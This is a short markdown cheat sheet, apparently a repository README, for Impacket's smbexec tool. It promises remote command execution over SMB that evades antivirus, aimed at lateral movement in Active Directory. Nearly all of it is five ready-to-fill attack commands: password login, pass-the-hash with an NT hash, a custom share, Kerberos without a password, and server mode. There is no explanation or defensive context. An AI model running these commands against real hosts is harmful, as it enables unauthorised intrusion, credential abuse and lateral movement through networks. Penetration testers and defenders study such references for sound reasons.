<h1 align="center">Impacket SmbExec Cheat Sheet</h1>

<p align="center">
  Advanced reference guide for remote command execution over SMB utilizing native Windows services to minimize disk footprint and evade traditional AV detection.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Active_Directory-111827?style=for-the-badge&logo=microsoft&logoColor=00A4EF">
  <img src="https://img.shields.io/badge/Impacket-SmbExec-111827?style=for-the-badge&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/OffSec-Lateral_Movement-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>

```
impacket-smbexec dominio.local/usuario_admin:Password123@IP_OBJETIVO
```

```
impacket-smbexec -hashes :HASH_NT dominio.local/usuario_admin@IP_OBJETIVO
```

```
impacket-smbexec -hashes :HASH_NT dominio.local/usuario_admin@IP_OBJETIVO -share C$
```

```
impacket-smbexec -k -no-pass dominio.local/usuario_admin@NOMBRE_HOST_FQDN
```

```
impacket-smbexec -hashes :HASH_NT dominio.local/usuario_admin@IP_OBJETIVO -mode SERVER
```
